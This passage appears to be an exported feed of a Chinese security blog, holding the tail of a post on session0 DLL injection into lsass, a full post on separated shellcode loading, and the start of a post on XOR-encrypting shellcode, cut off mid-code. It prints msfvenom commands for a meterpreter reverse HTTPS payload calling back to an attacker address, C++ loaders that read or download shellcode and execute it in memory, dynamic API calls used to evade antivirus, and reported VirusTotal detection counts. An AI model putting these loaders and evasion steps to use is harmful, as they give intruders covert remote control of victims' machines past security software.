class="built_in">Session0Inject</span>((DWORD)<span class="built_in">atoi</span>(argv[<span class="number">1</span>]), argv[<span class="number">2</span>]);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (<span class="number">-1</span> == bRet)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Inject dll failed\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Inject dll successfully\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;你需输入两个参数,参数1为pid,参数2为dll的绝对路径\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h1><p>首先获取lsass进程的PID，此处为696</p>
<img src="session0注入/image-20230611233900720.png" alt="image-20230611233900720" style="zoom:67%;" />	



<p>以管理员权限运行cmd，使用session0注入将dll注入至lsass进程中</p>
<p><img src="/session0%E6%B3%A8%E5%85%A5/image-20230611233625460.png" alt="image-20230611233625460">			</p>
<p>Cobalt Strike成功上线</p>
<p><img src="/session0%E6%B3%A8%E5%85%A5/image-20230611234019447.png" alt="image-20230611234019447"></p>
<p>在火绒剑可以看到lsass进程注入的dll</p>
<img src="session0注入/image-20230611234104530.png" alt="image-20230611234104530" style="zoom: 50%;" />	

<p>​			</p>
<h1 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h1><p><a href="https://github.com/xf555er/Session0_Inject">https://github.com/xf555er/Session0_Inject</a></p>
<p>​	</p>
<p>​	</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/04/29/shellcode%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本文详细介绍了如何通过文件加载和远程URL加载方式实现Shellcode分离加载，以规避安全软件的检测。文章首先描述了通过Metasploit Framework生成的shellcode文件加载的过程，并提供了相关的C++代码。</p>
<p>为了避免被杀毒软件检测，利用动态API调用和lazy_importer项目进行代码优化。其次，文章讨论了如何通过远程URL加载shellcode，也提供了相应的实现代码。整篇文章旨在帮助读者理解shellcode分离加载的具体实现过程和原理，同时通过实践操作增强对这一技术的掌握程度</p>
<h1 id="一、通过文件加载"><a href="#一、通过文件加载" class="headerlink" title="一、通过文件加载"></a>一、通过文件加载</h1><h2 id="msf生成shellcode文件"><a href="#msf生成shellcode文件" class="headerlink" title="msf生成shellcode文件"></a>msf生成shellcode文件</h2><p>使用<code>msfvenom</code>生成raw格式的文本文件, 但是raw格式的文本文件很容易就会被杀软查杀，为了防止通讯特征被检测到，此处我还做了msf流量加密，此处若想了解msf流量加密的朋友可以去看这篇文章：<a href="https://blog.csdn.net/xf555er/article/details/128051211?ops_request_misc=&request_id=&biz_id=&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~koosearch~default-1-128051211-null-null.268%5Ev1%5Ekoosearch&utm_term=%E6%B5%81%E9%87%8F&spm=1018.2226.3001.4450">MSF流量加密</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter_reverse_https lhost=192.168.47.155 lport=4444 PayloadUUIDTracking=true HandlerSSLCert=ssl.pem PayloadUUIDName=henry -f raw -o shellcode_raw.txt</span><br></pre></td></tr></table></figure>

<p><img src="/shellcode%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD/image-20230522202357728.png" alt="image-20230522202357728"></p>
<p>为了不被杀软查杀，并将其保存为十六进制格式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter_reverse_https lhost=192.168.47.155 lport=4444 PayloadUUIDTracking=true HandlerSSLCert=ssl.pem PayloadUUIDName=henry -f hex -o shellcode_hex.txt</span><br></pre></td></tr></table></figure>

<img src="shellcode分离加载/image-20230522202559734.png" alt="image-20230522202559734" style="zoom:67%;" />	



<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>这段代码的作用是从一个以十六进制表示的文件中读取shellcode，然后将其加载到内存中，并执行该shellcode</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将十六进制中的单个字符转换为相应的整数值</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">char</span> <span class="title">hexCharToByte</span><span class="params">(<span class="type">char</span> character)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (character &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; character &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> character - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (character &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; character &lt;= <span class="string">&#x27;f&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> character - <span class="string">&#x27;a&#x27;</span> + <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (character &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; character &lt;= <span class="string">&#x27;F&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> character - <span class="string">&#x27;A&#x27;</span> + <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将十六进制字符串转换成字节型数组</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hexStringToBytes</span><span class="params">(<span class="type">const</span> std::string&amp; hexString, <span class="type">unsigned</span> <span class="type">char</span>* byteArray, <span class="type">int</span> byteArraySize)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; hexString.<span class="built_in">length</span>(); i += <span class="number">2</span>) &#123;</span><br><span class="line">        byteArray[i / <span class="number">2</span>] = <span class="built_in">hexCharToByte</span>(hexString[i]) * <span class="number">16</span> + <span class="built_in">hexCharToByte</span>(hexString[i + <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line"></span><br><span class="line">    <span class="function">std::ifstream <span class="title">file</span><span class="params">(<span class="string">&quot;shellcode_hex.txt&quot;</span>)</span></span>;  <span class="comment">//打开指定文件</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">size_t</span> size;  <span class="comment">//定义文件内容的字节数</span></span><br><span class="line">    string contents; <span class="comment">//定义文件内容</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//判断文件是否打开成功</span></span><br><span class="line">    <span class="keyword">if</span> (file.<span class="built_in">is_open</span>()) &#123;</span><br><span class="line">        std::stringstream buffer; <span class="comment">//创建一个stringstream对象</span></span><br><span class="line">        buffer &lt;&lt; file.<span class="built_in">rdbuf</span>();  <span class="comment">//将文件的内容复制到该流中</span></span><br><span class="line">        contents = buffer.<span class="built_in">str</span>();  <span class="comment">//将stringstream对象的内容转换string,并将其存储在contents中</span></span><br><span class="line"></span><br><span class="line">        size = contents.<span class="built_in">length</span>()/<span class="number">2</span>;  <span class="comment">//由于两个十六进制相当于一个字节,因此文件内容长度需除以2</span></span><br><span class="line">        file.<span class="built_in">close</span>();  <span class="comment">//关闭文件</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//printf(&quot;%d\n&quot;, size); </span></span><br><span class="line">    <span class="comment">//cout &lt;&lt; contents;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 为存储转换后的shellcode分配内存</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* buffer = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(size);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 调用函数将十六进制字符串转换为字节型数组</span></span><br><span class="line">    <span class="built_in">hexStringToBytes</span>(contents, buffer, size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在内存中分配一块可以执行的区域</span></span><br><span class="line">    <span class="type">void</span>* exec = <span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 将shellcode复制到该区域</span></span><br><span class="line">    <span class="built_in">memcpy</span>(exec, buffer, size);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 执行该shellcode</span></span><br><span class="line">    ((<span class="built_in">void</span>(*) ())exec)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="代码优化"><a href="#代码优化" class="headerlink" title="代码优化"></a>代码优化</h2><p>火绒和WindowsDefender都报毒了, 其原因是内存申请函数<code>VirtualAlloc</code>被检测到了，那就使用动态调用api来绕过检测</p>
<p><img src="/shellcode%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD/image-20230522235637826.png" alt="image-20230522235637826"></p>
<p>导入<code>lazy_importer</code>项目来动态调用系统api, 然后在api函数前面添加上<code>(LI_FN)</code>，并将函数参数的<code>NULL</code>替换成<code>nullptr</code></p>
<p><img src="/shellcode%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD/image-20230523000215217.png" alt="image-20230523000215217"></p>
<p>​	</p>
<p>修改完代码后360不会报毒了, 上传到virus Total中的进行检测，查杀率为2&#x2F;70，效果还不错</p>
<p><img src="/shellcode%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD/image-20230523000118697.png" alt="image-20230523000118697">		</p>
<p><img src="/shellcode%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD/image-20230523000630744.png" alt="image-20230523000630744">		</p>
<h1 id="二、通过远程url加载"><a href="#二、通过远程url加载" class="headerlink" title="二、通过远程url加载"></a>二、通过远程url加载</h1><h2 id="http服务目录放置shellcode文件"><a href="#http服务目录放置shellcode文件" class="headerlink" title="http服务目录放置shellcode文件"></a>http服务目录放置shellcode文件</h2><p>另一种shellcode分离加载的方法是通过远程URL加载。首先，我们需要在HTTP服务目录放置shellcode文件，然后启用HTTP服务：<code>python -m http.server 8000</code></p>
<p><img src="/shellcode%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD/image-20230523230821603.png" alt="image-20230523230821603"></p>
<img src="shellcode分离加载/image-20230523230937729.png" alt="image-20230523230937729" style="zoom:67%;" />		



<h2 id="代码实现-1"><a href="#代码实现-1" class="headerlink" title="代码实现"></a>代码实现</h2><p>基于上述代码的基础上，添加了<code>GetUrl_HexContent</code>函数，其作用是从指定url下载内容并将其存储在给定的缓冲区中，随后加载至内存</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;wininet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;wininet.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;lazy_importer.hpp&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将十六进制中的单个字符转换为相应的整数值</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">char</span> <span class="title">hexCharToByte</span><span class="params">(<span class="type">char</span> character)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (character &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; character &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> character - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (character &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; character &lt;= <span class="string">&#x27;f&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> character - <span class="string">&#x27;a&#x27;</span> + <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (character &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; character &lt;= <span class="string">&#x27;F&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> character - <span class="string">&#x27;A&#x27;</span> + <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将十六进制字符串转换成字节型数组</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hexStringToBytes</span><span class="params">(<span class="type">const</span> std::string&amp; hexString, <span class="type">unsigned</span> <span class="type">char</span>* byteArray, <span class="type">int</span> byteArraySize)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; hexString.<span class="built_in">length</span>(); i += <span class="number">2</span>) &#123;</span><br><span class="line">        byteArray[i / <span class="number">2</span>] = <span class="built_in">hexCharToByte</span>(hexString[i]) * <span class="number">16</span> + <span class="built_in">hexCharToByte</span>(hexString[i + <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 从指定的URL下载内容并将其存储到给定的缓冲区中。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param url 要下载的URL</span></span><br><span class="line"><span class="comment"> * @param buffer 存储下载内容的缓冲区</span></span><br><span class="line"><span class="comment"> * @return 下载的字节数（注意：字节数是原始十六进制字符串长度的一半）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">GetUrl_HexContent</span><span class="params">(LPSTR url, std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt;&amp; buffer)</span> </span>&#123;</span><br><span class="line">    HINTERNET hInternet, hConnect;</span><br><span class="line">    DWORD bytesRead;</span><br><span class="line">    DWORD bufferSize = <span class="number">0</span>;</span><br><span class="line">    DWORD contentLength = <span class="number">0</span>;</span><br><span class="line">    DWORD index = <span class="number">0</span>;</span><br><span class="line">    DWORD bufferLength = <span class="built_in">sizeof</span>(bufferSize);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打开一个与互联网的连接</span></span><br><span class="line">    hInternet = <span class="built_in">InternetOpen</span>(<span class="string">L&quot;User Agent&quot;</span>, INTERNET_OPEN_TYPE_DIRECT, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hInternet == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;InternetOpen failed. Error: &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打开一个URL连接</span></span><br><span class="line">    hConnect = <span class="built_in">InternetOpenUrlA</span>(hInternet, url, <span class="literal">NULL</span>, <span class="number">0</span>, INTERNET_FLAG_RELOAD, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hConnect == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;InternetOpenUrlA failed. Error: &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line">        <span class="built_in">InternetCloseHandle</span>(hInternet);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查询HTTP响应头中的内容长度</span></span><br><span class="line">    <span class="built_in">HttpQueryInfo</span>(hConnect, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &amp;contentLength, &amp;bufferLength, &amp;index);</span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">char</span>&gt; <span class="title">hexBuffer</span><span class="params">(contentLength + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取URL返回的内容到hexBuffer中</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">InternetReadFile</span>(hConnect, &amp;hexBuffer[<span class="number">0</span>], contentLength, &amp;bytesRead)) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;InternetReadFile failed. Error: &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (bytesRead &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        hexBuffer[bytesRead] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="comment">// 调整buffer的大小，以便存储转换后的字节数据</span></span><br><span class="line">        buffer.<span class="built_in">resize</span>(bytesRead / <span class="number">2</span>);</span><br><span class="line">        <span class="comment">// 将十六进制字符串转换为字节型数组</span></span><br><span class="line">        <span class="built_in">hexStringToBytes</span>(&amp;hexBuffer[<span class="number">0</span>], &amp;buffer[<span class="number">0</span>], bytesRead / <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭连接</span></span><br><span class="line">    <span class="built_in">InternetCloseHandle</span>(hConnect);</span><br><span class="line">    <span class="built_in">InternetCloseHandle</span>(hInternet);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回读取到的字节数（注意：字节数是原始十六进制字符串长度的一半）</span></span><br><span class="line">    <span class="keyword">return</span> bytesRead / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 把这个URL换成你的shellcode文件的URL</span></span><br><span class="line">    LPSTR url = (<span class="type">char</span>*)<span class="string">&quot;http://127.0.0.1:8000/shellcode_hex.txt&quot;</span>; </span><br><span class="line">    </span><br><span class="line">    <span class="comment">//存放恶意代码的数组</span></span><br><span class="line">    std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt; buffer;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取远程url的16进制内容,并将其存放至buffer数组</span></span><br><span class="line">    <span class="type">size_t</span> size = <span class="built_in">GetUrl_HexContent</span>(url, buffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在内存中分配一块可以执行的区域</span></span><br><span class="line">    <span class="type">char</span>* exec = (<span class="type">char</span>*)<span class="built_in">LI_FN</span>(VirtualAlloc)(<span class="literal">nullptr</span>, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将shellcode复制到该区域</span></span><br><span class="line">    <span class="built_in">memcpy</span>(exec, buffer.<span class="built_in">data</span>(), size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行该shellcode</span></span><br><span class="line">    ((<span class="built_in">void</span>(*) ())exec)();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印buffer的内容，只为演示，实际使用中可能并不需要这一步</span></span><br><span class="line">    <span class="comment">/*for (size_t i = 0; i &lt; buffer.size(); i++) &#123;</span></span><br><span class="line"><span class="comment">        printf(&quot;%02X &quot;, buffer[i]);</span></span><br><span class="line"><span class="comment">        if ((i + 1) % 16 == 0) &#123;</span></span><br><span class="line"><span class="comment">            printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;*/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>VirusTotal检测只有一个报毒</p>
<p><img src="/shellcode%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD/image-20230523204811063.png" alt="image-20230523204811063">	</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/04/29/shellcode%E5%8A%A0%E5%AF%86/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="什么是私钥和公钥"><a href="#什么是私钥和公钥" class="headerlink" title="什么是私钥和公钥"></a>什么是私钥和公钥</h2><p>私钥和公钥是密码学中用于实现加密、解密和数字签名等功能的关键组件。</p>
<p>私钥是一种加密算法中的秘密密钥，只有密钥的拥有者可以访问和使用它。私钥通常用于数字签名和数据加密等场景中，它可以用于对数据进行加密，同时也可以用于解密已经被加密的数据。</p>
<p>公钥是与私钥对应的一种公开密钥，它可以被任何人访问和使用。公钥通常用于数据加密、身份认证和数字签名等场景中。公钥可以被用来加密数据，同时也可以用于验证数字签名的有效性。</p>
<p>在非对称加密算法中，公钥和私钥是一对密钥，它们共同参与加密和解密过程。公钥用于加密数据，而私钥用于解密数据。因此，使用非对称加密算法时，数据的接收方会将其私钥保存为秘密，而将其公钥发送给发送方。这样，发送方就可以使用接收方的公钥来加密数据，而接收方可以使用其私钥来解密数据。</p>
<p>需要注意的是，私钥和公钥是成对出现的，它们必须同时使用才能确保数据的安全性和完整性。因此，在使用私钥和公钥进行数据加密、解密和数字签名等操作时，必须确保私钥的安全性和保密性</p>
<h2 id="了解对称加密和非对称加密"><a href="#了解对称加密和非对称加密" class="headerlink" title="了解对称加密和非对称加密"></a>了解对称加密和非对称加密</h2><ul>
<li>对称加密：在对称加密中，加密和解密使用的是同一个密钥，通常称为共享密钥。这意味着在加密数据时，发送方和接收方都需要使用相同的密钥。对称加密算法的速度较快，适用于对大量数据进行加密。然而，对称加密的一个主要缺点是密钥管理。由于发送方和接收方需要使用相同的密钥，因此密钥的安全传输和存储成为一个挑战。一旦密钥被泄露，加密数据的安全性就会受到威胁。常见的对称加密算法有：AES（高级加密标准）、DES（数据加密标准）和3DES（三重数据加密标准）。</li>
<li>非对称加密：非对称加密使用一对密钥，分别称为公钥和私钥。公钥是公开的，可以被任何人获取，而私钥是保密的，只有密钥所有者才能访问。在非对称加密中，数据可以用公钥加密，然后只能用相应的私钥解密；反之亦然，用私钥加密的数据只能用公钥解密。这样，密钥的管理问题得到了解决，因为只需要保护私钥的安全。非对称加密的一个缺点是加密和解密过程相对较慢，因此通常不适用于加密大量数据。常见的非对称加密算法有：RSA（Rivest-Shamir-Adleman）、DSA（数字签名算法）和ECC（椭圆曲线密码学）。</li>
</ul>
<p>在实际应用中，对称加密和非对称加密通常会结合使用，以充分利用两者的优点。例如，通过非对称加密安全地传输对称加密的密钥，然后使用对称加密对数据进行加密。这样既解决了密钥管理问题，又能快速地加密大量数</p>
<h1 id="XOR加密"><a href="#XOR加密" class="headerlink" title="XOR加密"></a>XOR加密</h1><h2 id="什么是xor加密"><a href="#什么是xor加密" class="headerlink" title="什么是xor加密"></a>什么是xor加密</h2><p>XOR加密又称为异或加密，异或加密属于对称加密。在异或加密中，使用一个密钥（通常称为密钥流）与明文数据进行异或操作，生成加密后的密文。解密过程与加密过程相同，将密文与相同的密钥流进行异或操作，即可恢复原始明文数据</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>使用<code>Shellcode_XorEncoder.py</code>对shellcode进行异或加密，随后输出加密后的shellcode</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义异或加密函数，接收原始shellcode和密钥作为输入</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_encrypt</span>(<span class="params">shellcode, key</span>):</span><br><span class="line">    encrypted_shellcode = <span class="built_in">bytearray</span>()</span><br><span class="line">    key_len = <span class="built_in">len</span>(key)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 遍历shellcode中的每个字节</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(shellcode)):</span><br><span class="line">        <span class="comment"># 将当前字节与密钥中相应字节进行异或操作，然后添加到加密后的shellcode中</span></span><br><span class="line">        <span class="comment"># 这段代码中的i % key_len操作用于确保在对shellcode进行异或加密时，密钥循环使用</span></span><br><span class="line">        encrypted_shellcode.append(shellcode[i] ^ key[i % key_len])</span><br><span class="line">    <span class="keyword">return</span> encrypted_shellcode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 填写你的shellcode</span></span><br><span class="line">    <span class="comment"># buf = b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#通过bin文件获取shellcode</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload.bin&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        buf = file.read()</span><br><span class="line"></span><br><span class="line">    shellcode = <span class="built_in">bytearray</span>(buf)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义密钥</span></span><br><span class="line">    key = <span class="built_in">bytearray</span>(<span class="string">b&#x27;12henry1222345??6aa+-==@asd&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用xor_encrypt函数加密shellcode</span></span><br><span class="line">    encrypted_shellcode = xor_encrypt(shellcode, key)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出加密后的shellcode</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Encrypted shellcode:&quot;</span>)</span><br><span class="line">    encrypted_shellcode_string = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> encrypted_shellcode:</span><br><span class="line">        encrypted_shellcode_string += (<span class="string">&quot;\\x%02x&quot;</span>%byte)</span><br><span class="line">    <span class="built_in">print</span>(encrypted_shellcode_string)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>使用<code>xor加密.cpp</code>解密加密后的shellcode，随后将其加载进内存</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 存放xor加密后的shellcode</span></span><br><span class="line">    <span class="type">char</span> encryptedShellcode[] = <span class="string">&quot;...&quot;</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义解密所用的密钥</span></span><br><span class="line">    <span class="type">char</span> key[] = <span class="string">&quot;12henry1222345??6aa+-==@asd&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个与加密shellcode大小相同的数组用于存储解密后的shellcode</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> shellcode[<span class="keyword">sizeof</span> encryptedShellcode];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取密钥的长度</span></span><br><span class="line">    <span class="type">int</span> keylength = <span class="built_in">strlen</span>(key);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历加密的shellcode，并使用异或操作进行解密，将结果存储在shellcode数组中</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span> encryptedShellcode; i++) &#123;</span><br><span class="line">        shellcode[i] = encryptedShellcode[i] ^ key[i % keylength];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\\x%x&quot;</span>, shellcode[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取解密后的shellcode的地址</span></span><br><span 